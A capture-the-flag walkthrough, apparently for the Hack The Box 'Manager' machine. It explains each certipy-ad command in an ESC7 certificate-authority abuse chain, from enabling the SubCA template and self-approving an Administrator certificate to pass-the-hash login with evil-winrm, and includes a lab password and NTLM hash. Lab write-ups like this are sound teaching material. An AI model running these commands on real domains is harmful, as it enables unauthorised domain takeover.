# ESC7 Exploitation – Commands, Options, and Detailed Explanations

This document merges the contents of **ESC7_Exploitation_Steps.md** and **ESC7_Exploitation_Detailed.md**, providing both **option descriptions** and **purpose explanations** for each executed command.

---

## 1️⃣ Add Raven as CA Officer
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven
```
### 🔹 Options:
- `ca` → Interacts with the Certificate Authority.
- `-u raven@manager.htb` → User for authentication.
- `-p 'R4v3nBe5tD3veloP3r!123'` → Password for Raven.
- `-dc-ip 10.10.11.236` → Domain Controller IP.
- `-ca manager-dc01-ca` → Target CA name.
- `-add-officer raven` → Adds Raven as CA officer.

### 🔹 Why Used?
This command grants Raven officer privileges on the CA, enabling high-level control like approving certificate requests or modifying CA configuration, which is essential for exploiting ESC7.

---

## 2️⃣ Enable the SubCA Template
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
```
### 🔹 Options:
- `-enable-template subca` → Enables the SubCA template.

### 🔹 Why Used?
The SubCA template allows requesting subordinate CA certificates, which can issue certs for any account. Enabling it prepares the environment for privilege escalation via administrator impersonation.

---

## 3️⃣ List Enabled Templates
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates
```
### 🔹 Options:
- `-list-templates` → Displays enabled templates.

### 🔹 Why Used?
This confirms that the SubCA template is enabled and available for exploitation. Knowing available templates ensures selecting the most suitable one for privilege escalation.

---

## 4️⃣ Request Administrator Certificate Using SubCA
```
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
```
### 🔹 Options:
- `req` → Requests a certificate.
- `-template SubCA` → Uses the SubCA template.
- `-upn administrator@manager.htb` → Requests cert for Administrator UPN.

### 🔹 Why Used?
This command attempts to impersonate the Administrator by requesting a cert that authenticates as administrator@manager.htb, leveraging the SubCA template’s powerful capabilities.

---

## 5️⃣ Issue the Pending Request (ID 22)
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 22
```
### 🔹 Options:
- `-issue-request 22` → Approves request ID 22.

### 🔹 Why Used?
After submitting the certificate request, it remains pending. This command self-approves and issues the cert, abusing Raven’s ManageCA privileges to bypass administrative approval.

---

## 6️⃣ Retrieve the Administrator Certificate
```
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 22
```
### 🔹 Options:
- `-retrieve 22` → Retrieves issued cert with ID 22.

### 🔹 Why Used?
Downloads the issued administrator certificate as a PFX, which contains both the cert and its private key. This allows authentication without requiring a password or NT hash.

---

## 7️⃣ Authenticate as Administrator
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
### 🔹 Options:
- `auth` → Module for authentication using certificates.
- `-pfx administrator.pfx` → Administrator’s PFX file.
- `-dc-ip 10.10.11.236` → Domain Controller IP.

### 🔹 Why Used?
Authenticates as Administrator using the PFX, extracting the NTLM hash and proving full control over the domain account.

---

## 8️⃣ Final Domain Admin Access via Evil-WinRM
```
evil-winrm -u administrator -H 'ae5064c2f62317332c88629e025924ef' -i 10.10.11.236
```
### 🔹 Options:
- `-u administrator` → Username.
- `-H` → Use NTLM hash for login.
- `-i 10.10.11.236` → Domain Controller IP.

### 🔹 Why Used?
Leverages the obtained NTLM hash to establish a remote PowerShell session as Administrator, achieving full domain compromise and retrieving the `root.txt` flag.
